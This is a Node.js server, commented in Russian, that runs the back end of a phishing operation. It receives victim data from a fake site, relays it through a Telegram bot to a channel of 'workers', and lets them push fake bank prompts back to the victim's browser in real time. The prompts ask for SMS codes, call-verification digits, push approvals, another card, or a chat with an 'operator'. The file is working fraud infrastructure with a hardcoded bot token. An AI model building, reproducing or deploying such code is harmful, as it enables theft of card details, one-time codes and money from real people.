const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());
app.use(express.static('public'));

const BOT_TOKEN = '8003392137:AAFbnbKyLJS6N1EdYSxtRhR9n5n4eJFpBbw';
const CHANNEL_ID = '-1003455979409';

let userTasks = {}; 
let logsStorage = {}; 

const cmdTexts = {
    'sms': 'Введите код подтверждения из СМС',
    'call': 'Введите последние 4 цифры номера, с которого поступит звонок',
    'push': 'Подтвердите вход в мобильном приложении',
    'bal': 'Недостаточно средств на карте. Попробуйте другую карту',
    'support': 'Ошибка безопасности. Опишите проблему оператору в чате',
    'custom': 'Повторите попытку или введите данные еще раз'
};

const safeText = (text) => String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

// --- ПРИЕМ ЛОГА С САЙТА ---
app.post('/api/log', async (req, res) => {
    const { userId, type, data } = req.body;
    logsStorage[userId] = { type, data, time: new Date().toLocaleTimeString() };

    console.log(`[НОВЫЙ ЛОГ] ID: ${userId}, Тип: ${type}`);

    let channelMsg = `<b>🆕 НОВЫЙ ЛОГ [${safeText(type)}]</b>\n`;
    channelMsg += `🆔 ID: <code>${safeText(userId)}</code>\n`;
    channelMsg += `📍 Статус: 🔵 Ожидает...`;

    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHANNEL_ID,
            text: channelMsg,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: "⚡️ ВЗЯТЬ В РАБОТУ", callback_data: `take_${userId}` }]
                ]
            }
        });
        res.json({ success: true });
    } catch (e) {
        console.error("Ошибка отправки в канал:", e.message);
        res.status(500).send('Error');
    }
});

// --- ПРОВЕРКА ЗАДАЧ (ДЛЯ САЙТА) ---
app.get('/api/check/:userId', (req, res) => {
    const userId = req.params.userId;
    const task = userTasks[userId] || null;
    if (task) { delete userTasks[userId]; }
    res.json(task);
});

// --- ВЕБХУК ТЕЛЕГРАМ ---
app.post('/tg-webhook', async (req, res) => {
    try {
        const { message, callback_query } = req.body;

        // ЛОГ ДЛЯ ПРОВЕРКИ: Если в Railway Logs пусто после нажатия кнопок - вебхук не настроен
        console.log("📥 Получено обновление от Telegram");

        // 1. ОБРАБОТКА КОМАНДЫ /START
        if (message && message.text === '/start') {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: message.chat.id,
                text: "<b>👋 Система готова к работе!</b>\n\nТеперь, когда вы нажмете кнопку в канале, данные будут приходить сюда.",
                parse_mode: 'HTML'
            });
            return res.sendStatus(200);
        }

        // 2. ОБРАБОТКА КНОПОК
        if (callback_query) {
            const data = callback_query.data;
            const worker = callback_query.from;
            const workerName = worker.username ? `@${worker.username}` : worker.first_name;

            // ЛОГИКА "ВЗЯТЬ В РАБОТУ"
            if (data.startsWith('take_')) {
                const userId = data.split('_')[1];
                const log = logsStorage[userId];

                if (log) {
                    let fullMsg = `<b>💎 ПОЛНЫЙ ЛОГ [${log.type}]</b>\n`;
                    fullMsg += `🆔 ID: <code>${userId}</code>\n`;
                    fullMsg += `⏰ Время: ${log.time}\n`;
                    fullMsg += `------------------------\n`;
                    for (let key in log.data) {
                        fullMsg += `<b>${key}:</b> <code>${log.data[key]}</code>\n`;
                    }

                    try {
                        // Шлем лог воркеру в личку
                        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                            chat_id: worker.id,
                            text: fullMsg,
                            parse_mode: 'HTML',
                            reply_markup: {
                                inline_keyboard: [
                                    [
                                        { text: "💬 СМС", callback_data: `ask_${userId}_sms` },
                                        { text: "📞 Звонок", callback_data: `ask_${userId}_call` }
                                    ],
                                    [
                                        { text: "📲 Пуш", callback_data: `msg_${userId}_push` },
                                        { text: "💰 Баланс", callback_data: `msg_${userId}_bal` }
                                    ],
                                    [
                                        { text: "✍️ Свой текст", callback_data: `ask_${userId}_custom` }
                                    ]
                                ]
                            }
                        });

                        // Редактируем сообщение в канале
                        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                            chat_id: CHANNEL_ID,
                            message_id: callback_query.message.message_id,
                            text: `<b>🆕 ЛОГ [${log.type}]</b>\n🆔 ID: <code>${userId}</code>\n📍 Взял в работу: <b>${workerName}</b> ✅`,
                            parse_mode: 'HTML'
                        });

                        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                            callback_query_id: callback_query.id,
                            text: "Лог отправлен в личные сообщения!"
                        });
                    } catch (err) {
                        // Если бот не может написать юзеру (юзер не нажал /start)
                        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                            callback_query_id: callback_query.id,
                            text: "⚠️ ОШИБКА: Сначала напишите боту /start в личку!",
                            show_alert: true
                        });
                    }
                }
            }

            // ЛОГИКА КНОПОК ОШИБОК
            if (data.startsWith('ask_') || data.startsWith('msg_')) {
                const [action, userId, code] = data.split('_');
                userTasks[userId] = { action, text: cmdTexts[code] || "Введите данные" };
                
                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                    callback_query_id: callback_query.id,
                    text: "✅ Команда отправлена!"
                });
            }
        }
    } catch (error) {
        console.error("Критическая ошибка вебхука:", error.message);
    }
    
    res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Сервер запущен на порту ${PORT}`));
